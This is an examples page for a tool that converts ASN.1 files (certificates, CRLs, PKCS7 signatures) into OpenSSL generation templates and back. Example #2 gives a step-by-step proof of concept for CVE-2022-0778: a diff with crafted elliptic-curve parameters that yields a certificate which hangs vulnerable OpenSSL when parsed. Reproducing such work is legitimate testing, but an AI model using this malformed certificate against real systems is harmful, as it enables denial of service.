# ASN1 templating for fun and profit - Examples

## Example #1 - DER Encoded Certificate

Take an arbitrary DER encoded certificate:

```bash
$ wget -o /dev/null https://pki.goog/repo/certs/gtsr1.der
```

Convert it to an ASN1_generate_nconf(3) compatible textual description:

```bash
$ ./asn1template.pl gtsr1.der > gtsr1.tpl
```

Convert it back to DER encoded ASN1 with ASN1_generate_nconf(3):

```bash
$ openssl asn1parse -genconf gtsr1.tpl -noout -out gtsr1_new.der
```

Original and recreated DER files are identical:
```bash
$ diff gtsr1.der gtsr1_new.der 
$ echo $?
0
```

## Example #2 - CVE-2022-0778

This example is related to CVE-2022-0778. It is based on
https://github.com/drago-96/CVE-2022-0778 and this particular PR
https://github.com/drago-96/CVE-2022-0778/pull/4 .

Following the details presented in https://github.com/drago-96/CVE-2022-0778/pull/4 , first, generate a new EC private key:
```bash
$ openssl ecparam -out ec.key -name prime256v1 -genkey -noout -param_enc explicit -conv_form compressed
```

Then use it to generate a self signed certificate:
```bash
$ openssl req -new -x509 -key ec.key -out cert.der -outform DER -days 360 -subj "/CN=TEST/"
```

We can then generate a template from this certificate:
```bash
$ ./asn1template.pl cert.der > cert.tpl
$ cat cert.tpl
asn1 = SEQUENCE:seq1
[seq1]
field2 = SEQUENCE:seq2
field3 = SEQUENCE:seq3
field4 = FORMAT:HEX,BITSTRING:30450221008EF9E6F07C16DCAD2DAA92FACE41CEF56121EB4A230114CE7178B51937CDA20502203180533CA0986C908CD120489FDD29F6B8A3FF75C1393E4B06B2F7C4F82F0B97
[seq2]
field5 = IMPLICIT:0C,SEQUENCE:seq4
field6 = INTEGER:0x57D640F4EDDEAE0E65C364F8606F8401E73470C2
field7 = SEQUENCE:seq5
field8 = SEQUENCE:seq6
field9 = SEQUENCE:seq7
field10 = SEQUENCE:seq8
field11 = SEQUENCE:seq9
field12 = IMPLICIT:3C,SEQUENCE:seq10
[seq4]
field13 = INTEGER:0x02
[seq5]
field14 = OBJECT:ecdsa-with-SHA256
[seq6]
field15 = SET:seq11
[seq11]
field16 = SEQUENCE:seq12
[seq12]
field17 = OBJECT:commonName
field18 = FORMAT:UTF8,UTF8String:"TEST"
[seq7]
field19 = UTCTIME:220320211232Z
field20 = UTCTIME:230315211232Z
[seq8]
field21 = SET:seq13
[seq13]
field22 = SEQUENCE:seq14
[seq14]
field23 = OBJECT:commonName
field24 = FORMAT:UTF8,UTF8String:"TEST"
[seq9]
field25 = SEQUENCE:seq15
field26 = FORMAT:HEX,BITSTRING:02DB70822B848189FDFE177D9E0CED95CCEFB7B428F76C88F4BE120A421DA68C68
[seq15]
field27 = OBJECT:id-ecPublicKey
field28 = SEQUENCE:seq16
[seq16]
field29 = INTEGER:0x01
field30 = SEQUENCE:seq17
field31 = SEQUENCE:seq18
field32 = FORMAT:HEX,OCTETSTRING:046B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C2964FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5
field33 = INTEGER:0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
field34 = INTEGER:0x01
[seq17]
field35 = OBJECT:prime-field
field36 = INTEGER:0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF
[seq18]
field37 = FORMAT:HEX,OCTETSTRING:FFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFC
field38 = FORMAT:HEX,OCTETSTRING:5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B
field39 = FORMAT:HEX,BITSTRING:C49D360886E704936A6678E1139D26B7819F7E90
[seq10]
field40 = SEQUENCE:seq19
[seq19]
field41 = SEQUENCE:seq20
field42 = SEQUENCE:seq21
field43 = SEQUENCE:seq22
[seq20]
field44 = OBJECT:X509v3 Subject Key Identifier
field45 = FORMAT:HEX,OCTETSTRING:04145B14DB3777D5A9F9D9EBFFE5021C77F9BCAFC676
[seq21]
field46 = OBJECT:X509v3 Authority Key Identifier
field47 = FORMAT:HEX,OCTETSTRING:301680145B14DB3777D5A9F9D9EBFFE5021C77F9BCAFC676
[seq22]
field48 = OBJECT:X509v3 Basic Constraints
field49 = BOOLEAN:true
field50 = FORMAT:HEX,OCTETSTRING:30030101FF
[seq3]
field51 = OBJECT:ecdsa-with-SHA256
```

Change some of the values in the template according to https://github.com/drago-96/CVE-2022-0778 and https://github.com/drago-96/CVE-2022-0778/pull/4 :
```bash
$ diff -u cert.tpl cert_new.tpl
--- cert.tpl	2022-03-20 12:25:32.187000000 +0100
+++ cert_new.tpl	2022-03-20 12:32:48.878000000 +0100
@@ -48,11 +48,11 @@
 field34 = INTEGER:0x01
 [seq17]
 field35 = OBJECT:prime-field
-field36 = INTEGER:0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF
+field36 = INTEGER:0x2B9
 [seq18]
-field37 = FORMAT:HEX,OCTETSTRING:FFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFC
-field38 = FORMAT:HEX,OCTETSTRING:5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B
-field39 = FORMAT:HEX,BITSTRING:C49D360886E704936A6678E1139D26B7819F7E90
+field37 = FORMAT:HEX,OCTETSTRING:0000000000000000000000000000000000000000000000000000000000000017
+field38 = FORMAT:HEX,OCTETSTRING:0000000000000000000000000000000000000000000000000000000000000000
+field39 = FORMAT:HEX,BITSTRING:0308
 [seq10]
 field40 = SEQUENCE:seq19
 [seq19]
```

Then convert the template back to DER encoded ASN1:
```bash
$ openssl asn1parse -genconf cert_new.tpl -noout -out cert_new.der

```

Finally, try to display this certificate with a CVE-2022-0778 vulnerable OpenSSL installation:
```bash
$ openssl x509 -inform DER -in cert_new.der -noout -text
```

## Example #3 - CRL file and PKCS7

It works on certificates, but, more generally, on arbitrary DER encoded ASN1
blobs. Here is the same as example #1 but with a CRL file:

```bash
$ wget -o /dev/null https://crl.pki.goog/gtsr1/gtsr1.crl
$ ./asn1template.pl gtsr1.crl > gtsr1.tpl
$ openssl asn1parse -genconf gtsr1.tpl -noout -out gtsr1_new.crl
$ diff gtsr1.crl gtsr1_new.crl
$ echo $?
0
```

Or with an smime.p7s email signature taken from https://datatracker.ietf.org/doc/html/rfc4134 (page 87):

```bash
$ cat <<EOF > smime.p7s.base64
MIIDdwYJKoZIhvcNAQcCoIIDaDCCA2QCAQExCTAHBgUrDgMCGjALBgkqhkiG9w0BBwGgggL
gMIIC3DCCApugAwIBAgICAMgwCQYHKoZIzjgEAzASMRAwDgYDVQQDEwdDYXJsRFNTMB4XDT
k5MDgxNzAxMTA0OVoXDTM5MTIzMTIzNTk1OVowEzERMA8GA1UEAxMIQWxpY2VEU1MwggG2M
IIBKwYHKoZIzjgEATCCAR4CgYEAgY3N7YPqCp45PsJIKKPkR5PdDteoDuxTxauECE//lOFz
SH4M1vNESNH+n6+koYkv4dkwyDbeP5u/t0zcX2mK5HXQNwyRCJWb3qde+fz0ny/dQ6iLVPE
/sAcIR01diMPDtbPjVQh11Tl2EMR4vf+dsISXN/LkURu15AmWXPN+W9sCFQDiR6YaRWa4E8
baj7g3IStii/eTzQKBgCY40BSJMqo5+z5t2UtZakx2IzkEAjVc8ssaMMMeUF3dm1nizaoFP
VjAe6I2uG4Hr32KQiWn9HXPSgheSz6Q+G3qnMkhijt2FOnOLl2jB80jhbgvMAF8bUmJEYk2
RL34yJVKU1a14vlz7BphNh8Rf8K97dFQ/5h0wtGBSmA5ujY5A4GEAAKBgFzjuVp1FJYLqXr
d4z+p7Kxe3L23ExE0phaJKBEj2TSGZ3V1ExI9Q1tv5VG/+onyohs+JH09B41bY8i7RaWgSu
OF1s4GgD/oI34a8iSrUxq4Jw0e7wi/ZhSAXGKsZfoVi/G7NNTSljf2YUeyxDKE8H5BQP1Gp
2NOM/Kl4vTyg+W4o4GBMH8wDAYDVR0TAQH/BAIwADAOBgNVHQ8BAf8EBAMCBsAwHwYDVR0j
BBgwFoAUcEQ+gi5vh95K03XjPSC8QyuT8R8wHQYDVR0OBBYEFL5sobPjwfftQ3CkzhMB4v3
jl/7NMB8GA1UdEQQYMBaBFEFsaWNlRFNTQGV4YW1wbGUuY29tMAkGByqGSM44BAMDMAAwLQ
IUVQykGR9CK4lxIjONg2q1PWdrv0UCFQCfYVNSVAtcst3a53Yd4hBSW0NevTFjMGECAQEwG
DASMRAwDgYDVQQDEwdDYXJsRFNTAgIAyDAHBgUrDgMCGjAJBgcqhkjOOAQDBC4wLAIUM/mG
f6gkgp9Z0XtRdGimJeB/BxUCFGFFJqwYRt1WYcIOQoGiaowqGzVI
EOF
$ base64 -d - < smime.p7s.base64 > smime.p7s
$ ./asn1template.pl smime.p7s > smime.p7s.tpl
$ openssl asn1parse -genconf smime.p7s.tpl -noout -out smime.p7s_new
$ diff smime.p7s smime.p7s_new
$ echo $?
0
```

## Example #4 - PEM Encoded Certificate

It also works with PEM files:

```bash
$ wget -o /dev/null https://pki.goog/repo/certs/gtsr1.pem
```

Convert it to an ASN1_generate_nconf(3) compatible textual description:

```bash
$ ./asn1template.pl gtsr1.pem > gtsr1.tpl
```

Convert it back to DER encoded ASN1 with ASN1_generate_nconf(3):

```bash
$ openssl asn1parse -genconf gtsr1.tpl -noout -out gtsr1_new.der
```

Then back to PEM:
```bash
$ openssl x509 -inform DER -in gtsr1_new.der -outform PEM -out gtsr1_new.pem
```

Original and recreated PEM files are identical:
```bash
$ diff gtsr1.pem gtsr1_new.pem
$ echo $?
0
```

## Example #5 - Explicit tags
Let's consider the following configuration template that contains an explicit
tag definition:

```bash
$ cat test.tpl
asn1 = SEQUENCE:seq1
[seq1]
field1 = EXPLICIT:0A,IA5STRING:Hello World
```

We can generate the corresponding DER encoded file:
```bash
$ openssl asn1parse -genconf test.tpl -out test.der
    0:d=0  hl=2 l=  15 cons: SEQUENCE          
    2:d=1  hl=2 l=  13 cons: appl [ 0 ]        
    4:d=2  hl=2 l=  11 prim: IA5STRING         :Hello World
```

The DER encoded file can be read with the asn1parse OpenSSL app:
```bash
$ openssl asn1parse -in test.der -i -inform D
    0:d=0  hl=2 l=  15 cons: SEQUENCE          
    2:d=1  hl=2 l=  13 cons:  appl [ 0 ]        
    4:d=2  hl=2 l=  11 prim:   IA5STRING         :Hello World
```

We can see the entry point sequence (seq1) followed by a tagged sequence (appl
[ 0 ]) containing the IA5STRING.

The template can then be extracted from the DER encoded file:
```bash
$ ./asn1template.pl test.der | tee test2.tpl
asn1 = SEQUENCE:seq1
[seq1]
field2 = IMPLICIT:0A,SEQUENCE:seq2
[seq2]
field3 = IA5STRING:"Hello\ World"
```
We can see that the explicit tag has been replaced by an implicitly tagged sequence (seq2).

This template can finally be used to generate the associated DER encode file:
```bash
$ openssl asn1parse -genconf test2.tpl -out test2.der 
    0:d=0  hl=2 l=  15 cons: SEQUENCE          
    2:d=1  hl=2 l=  13 cons: appl [ 0 ]        
    4:d=2  hl=2 l=  11 prim: IA5STRING         :Hello World
```

Both DER encoded files are identical. ```test.der``` originates from a
configuration template with an explicit tag, ```test2.der``` originates from an
equivalent configuration template containing an implicit tag:
```bash
$ diff test.der test2.der
$ echo $?
0
```

